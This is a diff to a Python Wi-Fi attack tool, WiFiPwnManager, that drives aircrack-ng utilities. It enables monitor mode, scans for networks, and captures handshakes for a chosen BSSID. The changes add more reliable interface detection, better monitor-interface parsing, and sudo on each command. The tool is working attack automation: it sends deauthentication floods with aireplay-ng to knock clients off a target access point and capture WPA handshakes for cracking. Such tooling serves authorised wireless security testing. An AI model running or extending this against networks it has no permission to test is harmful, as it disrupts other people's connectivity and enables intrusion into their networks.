@@ -67,8 +67,28 @@ class WiFiPwnManager:
     # Interface management
     # ------------------------------------------------------------------
     def get_wireless_interfaces(self):
-        """List wireless interfaces available on the system."""
-        interfaces = []
+        """List wireless interfaces available on the system using multiple methods."""
+        interfaces = set()
+
+        # Method 1: /sys/class/net/*/wireless (most reliable on Linux)
+        try:
+            for iface_path in glob.glob("/sys/class/net/*/wireless"):
+                iface = iface_path.split("/")[4]
+                interfaces.add(iface)
+        except Exception:
+            pass
+
+        # Method 2: /proc/net/wireless
+        try:
+            with open("/proc/net/wireless", "r") as f:
+                for line in f.readlines()[2:]:  # skip header lines
+                    iface = line.strip().split(":")[0]
+                    if iface:
+                        interfaces.add(iface)
+        except Exception:
+            pass
+
+        # Method 3: iw dev
         try:
             result = subprocess.run(
                 ["iw", "dev"],
@@ -77,10 +97,30 @@ class WiFiPwnManager:
             for line in result.stdout.splitlines():
                 line = line.strip()
                 if line.startswith("Interface"):
-                    interfaces.append(line.split()[1])
-        except Exception as e:
-            _emit("wifi", f"Failed to list wireless interfaces: {e}")
-        return interfaces
+                    interfaces.add(line.split()[1])
+        except Exception:
+            pass
+
+        # Method 4: iwconfig (catches interfaces the others might miss)
+        try:
+            result = subprocess.run(
+                ["iwconfig"],
+                capture_output=True, text=True, timeout=10
+            )
+            for line in result.stdout.splitlines():
+                if "IEEE 802.11" in line or "ESSID" in line:
+                    iface = line.split()[0]
+                    if iface:
+                        interfaces.add(iface)
+        except Exception:
+            pass
+
+        if not interfaces:
+            _emit("wifi", "No wireless interfaces found")
+        else:
+            _emit("wifi", f"Found wireless interfaces: {', '.join(sorted(interfaces))}")
+
+        return sorted(interfaces)
 
     def enable_monitor_mode(self, interface):
         """Put *interface* into monitor mode, return the monitor interface name."""
@@ -90,32 +130,48 @@ class WiFiPwnManager:
 
             # Kill interfering processes
             subprocess.run(
-                ["airmon-ng", "check", "kill"],
+                ["sudo", "airmon-ng", "check", "kill"],
                 capture_output=True, text=True, timeout=15
             )
 
             result = subprocess.run(
-                ["airmon-ng", "start", interface],
+                ["sudo", "airmon-ng", "start", interface],
                 capture_output=True, text=True, timeout=15
             )
 
-            # Derive the monitor interface name
-            mon_iface = f"{interface}mon"
-            # Check if airmon-ng renamed it
-            for line in result.stdout.splitlines():
-                m = re.search(r"monitor mode.*enabled.*on\s+(\S+)", line, re.I)
-                if m:
-                    mon_iface = m.group(1)
-                    break
+            output = result.stdout + result.stderr
+            _emit("wifi", f"airmon-ng output: {output[:300]}")
 
-            # Verify interface exists
-            check = subprocess.run(
-                ["iw", "dev"], capture_output=True, text=True, timeout=10
-            )
-            if mon_iface not in check.stdout:
-                # Fallback: try the original name (some drivers)
-                if interface in check.stdout:
-                    mon_iface = interface
+            mon_iface = None
+
+            # Parse: "(mac80211 monitor mode vif enabled on [phy0]wlan0mon"
+            m = re.search(r"monitor mode vif enabled on \[.*?\](\S+)", output)
+            if m:
+                mon_iface = m.group(1).rstrip(")")
+
+            # Parse: "monitor mode already enabled for [phy0]wlan0mon"
+            if not mon_iface:
+                m = re.search(r"monitor mode.*enabled.*\[.*?\](\S+)", output)
+                if m:
+                    mon_iface = m.group(1).rstrip(")")
+
+            # Fallback: check iw dev for any monitor-type interface
+            if not mon_iface:
+                check = subprocess.run(
+                    ["iw", "dev"], capture_output=True, text=True, timeout=10
+                )
+                current_iface = None
+                for line in check.stdout.splitlines():
+                    line_s = line.strip()
+                    if line_s.startswith("Interface"):
+                        current_iface = line_s.split()[1]
+                    elif "type monitor" in line_s and current_iface:
+                        mon_iface = current_iface
+                        break
+
+            if not mon_iface:
+                _emit("wifi", "Failed to determine monitor interface name")
+                return None
 
             self.monitor_iface = mon_iface
             _emit("wifi", f"Monitor mode enabled on {mon_iface}")
@@ -133,12 +189,12 @@ class WiFiPwnManager:
         try:
             _emit("wifi", f"Disabling monitor mode on {iface}...")
             subprocess.run(
-                ["airmon-ng", "stop", iface],
+                ["sudo", "airmon-ng", "stop", iface],
                 capture_output=True, text=True, timeout=15
             )
             # Restart network manager
             subprocess.run(
-                ["systemctl", "start", "NetworkManager"],
+                ["sudo", "systemctl", "start", "NetworkManager"],
                 capture_output=True, text=True, timeout=10
             )
             self.monitor_iface = None
@@ -169,7 +225,7 @@ class WiFiPwnManager:
         try:
             proc = subprocess.Popen(
                 [
-                    "airodump-ng",
+                    "sudo", "airodump-ng",
                     "--output-format", "csv",
                     "--write", csv_prefix,
                     iface,
@@ -184,8 +240,10 @@ class WiFiPwnManager:
             _emit("wifi", f"Scan error: {e}")
             return []
 
-        # Parse the CSV
-        csv_file = f"{csv_prefix}-01.csv"
+        # Parse the CSV — find the actual file (number may vary)
+        csv_candidates = sorted(glob.glob(f"{csv_prefix}*.csv"))
+        csv_file = csv_candidates[0] if csv_candidates else f"{csv_prefix}-01.csv"
+        _emit("wifi", f"Parsing CSV: {csv_file} (exists: {os.path.exists(csv_file)})")
         networks = self._parse_airodump_csv(csv_file)
         self.networks = networks
         _emit("wifi", f"Found {len(networks)} networks")
@@ -280,14 +338,14 @@ class WiFiPwnManager:
 
         # Set channel
         subprocess.run(
-            ["iwconfig", iface, "channel", str(channel)],
+            ["sudo", "iwconfig", iface, "channel", str(channel)],
             capture_output=True, text=True, timeout=5,
         )
 
         # Start airodump-ng capturing for this BSSID
         airodump = subprocess.Popen(
             [
-                "airodump-ng",
+                "sudo", "airodump-ng",
                 "--bssid", bssid,
                 "--channel", str(channel),
                 "--output-format", "cap",
@@ -306,7 +364,7 @@ class WiFiPwnManager:
                     break
                 subprocess.run(
                     [
-                        "aireplay-ng",
+                        "sudo", "aireplay-ng",
                         "--deauth", "10",
                         "-a", bssid,
                         iface,
@@ -355,7 +413,7 @@ class WiFiPwnManager:
         """Use aircrack-ng to verify a captured handshake."""
         try:
             result = subprocess.run(
-                ["aircrack-ng", cap_file],
+                ["sudo", "aircrack-ng", cap_file],
                 capture_output=True, text=True, timeout=15,
             )
             output = result.stdout + result.stderr
